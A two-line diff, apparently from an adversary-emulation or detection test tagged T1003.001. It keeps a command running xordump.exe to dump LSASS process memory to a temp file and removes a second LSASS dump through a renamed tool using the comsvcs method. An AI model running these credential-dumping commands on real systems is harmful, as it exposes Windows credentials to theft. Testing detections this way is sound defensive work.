@@ -1,2 +1,1 @@
 "C:\Windows\Temp\xordump.exe" -out C:\Windows\Temp\lsass-xordump.t1003.001.dmp -x 0x41
-renamed_tool.exe -process "lsass.exe" -m "comsvcs"
